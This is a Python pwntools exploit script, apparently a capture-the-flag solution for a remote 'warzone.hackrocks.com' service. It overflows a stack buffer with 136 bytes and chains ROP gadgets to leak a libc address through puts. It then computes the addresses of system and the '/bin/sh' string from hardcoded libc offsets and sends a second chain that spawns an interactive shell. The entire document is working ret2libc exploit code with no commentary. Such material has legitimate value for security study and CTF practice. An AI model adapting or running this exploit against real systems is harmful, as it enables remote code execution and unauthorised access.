from pwn import *
p = remote("warzone.hackrocks.com", 7770)
p.recvuntil(b'u got')

leak_libc = b'a'*136
leak_libc += p64(0x000000000040122b) # pop rdi ; ret
leak_libc += p64(0x404018) # puts.got.plt
leak_libc += p64(0x401030) # puts@plt
leak_libc += p64(0x0000000000401165) # int main()

p.sendline(leak_libc)

leak = p.recvuntil(b'u got')
print(b'raw leak: '+leak)
leak = leak.split(b'\n')
leak = u64(leak[1]+b'\x00\x00')
log.success("parsed: "+hex(leak))
# https://libc.rip/download/libc6_2.28-10+deb10u1_amd64.symbols
libc = leak - 0x71910
system = libc + 0x449c0
shell = libc + 0x180519

payload = b'a'*136
payload += p64(0x000000000040122b) # pop rdi ; ret
payload += p64(shell) # address of /bin/sh
payload += p64(system) # system

p.sendline(payload)
p.interactive()
